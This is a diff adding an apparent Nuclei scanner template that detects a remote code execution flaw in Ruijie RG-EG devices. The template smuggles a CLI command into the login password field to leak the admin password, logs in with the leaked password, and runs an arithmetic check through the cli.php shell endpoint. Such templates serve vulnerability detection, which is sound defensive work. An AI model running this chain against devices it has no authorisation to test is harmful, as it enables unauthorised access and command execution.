@@ -1,0 +1,82 @@
+id: ruijie-rce-cnvd-2021-09650
+info:
+  name: Ruijie RG-EG CLI Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template exploits a Remote Code Execution vulnerability in Ruijie RG-EG devices.
+  reference:
+    - https://blog.csdn.net/qq_41617034/article/details/119532322
+
+variables:
+  r1: "{{rand_int(8000, 10000)}}"
+  r2: "{{rand_int(8000, 10000)}}"
+
+http:
+  - id: initial-login
+    method: POST
+    path:
+      - '{{BaseURL}}/login.php'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      username=admin&password=admin?show+webmaster+user
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'text/json'
+        part: header
+    extractors:
+      - type: regex
+        name: password
+        internal: true
+        regex:
+          - '"data":.*admin\\s?(?P<password>[^\\"]*)'
+
+  - id: authenticated-login
+    method: POST
+    path:
+      - '{{BaseURL}}/login.php'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      username=admin&password={{password}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'text/json'
+        part: header
+      - type: word
+        words:
+          - 'user=admin'
+        part: header
+      - type: word
+        words:
+          - '{"data":"0","status":1}'
+        part: body
+
+  - id: execute-rce
+    method: POST
+    path:
+      - '{{BaseURL}}/cli.php?a=shell'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      notdelay=true&command=expr {{r1}} * {{r2}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{{r1 * r2}}'
+        part: body
